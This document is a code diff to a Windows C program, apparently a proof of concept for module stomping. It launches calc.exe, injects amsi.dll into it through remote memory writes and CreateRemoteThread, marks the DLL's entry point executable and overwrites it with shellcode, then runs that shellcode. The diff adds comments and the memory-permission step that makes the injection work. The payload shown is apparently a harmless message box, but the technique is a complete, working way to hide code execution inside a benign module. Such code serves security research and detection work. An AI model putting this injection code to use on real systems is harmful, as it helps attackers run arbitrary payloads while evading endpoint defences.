@@ -2,22 +2,23 @@
 #include <Windows.h>
 #include <Psapi.h>
 
-int main()
+INT main()
 {
 	STARTUPINFOA			startupInfo;
 	PROCESS_INFORMATION		processInformation;
 	DWORD					dwPid;
 	DWORD					dwModulesSizeNeeded = 0;
-	const DWORD				headerBufferSize = 0x1000;
+	DWORD					dwOldProtect = 0;
+	const DWORD				dwHeaderBufferSize = 0x1000;
 	FARPROC					llLoadLibraryWAddress;
-	HANDLE					hProcessHandle;
+	HANDLE					hProcessHandle = NULL;
 	HANDLE					hDllThread;
 	HMODULE					hKernel32;
 	HMODULE					hRemoteModule;
 	HMODULE					modules[256] = { 0 };
 	const SIZE_T			ullModulesSize = sizeof(modules);
 	SIZE_T					ullModulesCount;
-	PVOID					pRemoteBuffer;
+	LPVOID					pRemoteBuffer;
 	LPVOID					pTargetProcessHeaderBuffer;
 	LPVOID					pDllEntryPoint;
 	WCHAR					cModuleToInject[] = L"C:\\windows\\system32\\amsi.dll";
@@ -27,28 +28,32 @@ int main()
 	PIMAGE_DOS_HEADER		dosHeader;
 	PIMAGE_NT_HEADERS		ntHeader;
 
-	ZeroMemory(&startupInfo, sizeof(startupInfo));
-	startupInfo.cb = sizeof(startupInfo);
-	ZeroMemory(&processInformation, sizeof(processInformation));
+	ZeroMemory(&startupInfo, sizeof startupInfo);
+	startupInfo.cb = sizeof startupInfo;
+	ZeroMemory(&processInformation, sizeof processInformation);
 
+	// Opens process
 	if (!CreateProcessA(NULL, "\"calc.exe\"", NULL, NULL, FALSE,
 		DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
 		printf("[-] CreateProcess failed: (%lu).\n", GetLastError());
 		goto Cleanup;
 	}
 
+	// Get handle to process
 	dwPid = processInformation.dwProcessId;
 	if ((hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
 		printf("[-] Could not get handle to target process: (%lu).\n", GetLastError());
 		goto Cleanup;
 	}
 
-	if ((pRemoteBuffer = VirtualAllocEx(hProcessHandle, NULL, sizeof(cModuleToInject), MEM_COMMIT, PAGE_READWRITE)) == NULL) {
+	// Allocate buffer in process with dll name
+	if ((pRemoteBuffer = VirtualAllocEx(hProcessHandle, NULL, sizeof cModuleToInject, MEM_COMMIT, PAGE_READWRITE)) == NULL) {
 		printf("[-] Failed allocating memory in target process: (%lu).\n", GetLastError());
 		goto Cleanup;
 	}
 
-	if (!WriteProcessMemory(hProcessHandle, pRemoteBuffer, (LPVOID)cModuleToInject, sizeof(cModuleToInject), NULL)) {
+	// Write dll name to buffer
+	if (!WriteProcessMemory(hProcessHandle, pRemoteBuffer, (LPVOID)cModuleToInject, sizeof cModuleToInject, NULL)) {
 		printf("[-] Failed writing memory in target process: (%lu).\n", GetLastError());
 		goto Cleanup;
 	}
@@ -58,19 +63,21 @@ int main()
 		goto Cleanup;
 	}
 
+	// Get lib load func proc address
 	llLoadLibraryWAddress = GetProcAddress(hKernel32, "LoadLibraryW");
 	threadRoutine = (PTHREAD_START_ROUTINE)llLoadLibraryWAddress;
-	
+
+	// Load dll to process
 	if ((hDllThread = CreateRemoteThread(hProcessHandle, NULL, 0, threadRoutine, pRemoteBuffer, 0, NULL)) != INVALID_HANDLE_VALUE) {
 		WaitForSingleObject(hDllThread, 1000);
 
-		// find base address of the injected benign DLL in remote process
+		// Find base address of the injected benign DLL in remote process
 		EnumProcessModules(hProcessHandle, modules, ullModulesSize, &dwModulesSizeNeeded);
 		ullModulesCount = dwModulesSizeNeeded / sizeof(HMODULE);
 		for (size_t i = 0; i < ullModulesCount; i++)
 		{
 			hRemoteModule = modules[i];
-			GetModuleBaseNameA(hProcessHandle, hRemoteModule, cRemoteModuleName, sizeof(cRemoteModuleName));
+			GetModuleBaseNameA(hProcessHandle, hRemoteModule, cRemoteModuleName, sizeof cRemoteModuleName);
 
 			if (strcmp(cRemoteModuleName, "amsi.dll") == 0)
 			{
@@ -83,29 +90,39 @@ int main()
 		goto Cleanup;
 		
 Continue:
-		// get DLL's AddressOfEntryPoint
-		if ((pTargetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize)) == NULL) {
+		// Get DLL's AddressOfEntryPoint
+		if ((pTargetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwHeaderBufferSize)) == NULL) {
 			printf("[-] Unable to get DLL's AddressOfEntryPoint: (%lu).\n", GetLastError());
 			goto Cleanup;
 		}
 
-		ReadProcessMemory(hProcessHandle, pRemoteBuffer, pTargetProcessHeaderBuffer, headerBufferSize, NULL);
+		ReadProcessMemory(hProcessHandle, pRemoteBuffer, pTargetProcessHeaderBuffer, dwHeaderBufferSize, NULL);
 
 		dosHeader = (PIMAGE_DOS_HEADER)pTargetProcessHeaderBuffer;
 		ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pTargetProcessHeaderBuffer + dosHeader->e_lfanew);
 		pDllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)pRemoteBuffer);
 
-		// write shellcode to DLL's AddressofEntryPoint
-		if (!WriteProcessMemory(hProcessHandle, pDllEntryPoint, (LPCVOID)bMessageboxShellcode64, sizeof(bMessageboxShellcode64), NULL)) {
+		// Set permission of DLL's AddressofEntryPoint
+		if (!VirtualProtectEx(hProcessHandle, pDllEntryPoint, sizeof bMessageboxShellcode64, PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
+			printf("[-] Unable to set  DLL's AddressofEntryPoint to PAGE_EXECUTE_READWRITE: (%lu).\n", GetLastError());
+			goto Cleanup;
+		}
+		
+		// Write shellcode to DLL's AddressofEntryPoint
+		if (!WriteProcessMemory(hProcessHandle, pDllEntryPoint, (LPCVOID)bMessageboxShellcode64, sizeof bMessageboxShellcode64, NULL)) {
 			printf("[-] Unable to write shellcode to DLL's AddressofEntryPoint: (%lu).\n", GetLastError());
 			goto Cleanup;
 		}
 
-		// execute shellcode from inside the benign DLL
+		// Execute shellcode from inside the benign DLL
 		CreateRemoteThread(hProcessHandle, NULL, 0, (PTHREAD_START_ROUTINE)pDllEntryPoint, NULL, 0, NULL);
 	}
 
 Cleanup:
 	CloseHandle(processInformation.hProcess);
 	CloseHandle(processInformation.hThread);
+#ifdef _DEBUG
+	if (hProcessHandle)
+		TerminateProcess(hProcessHandle, 0);
+#endif
 }
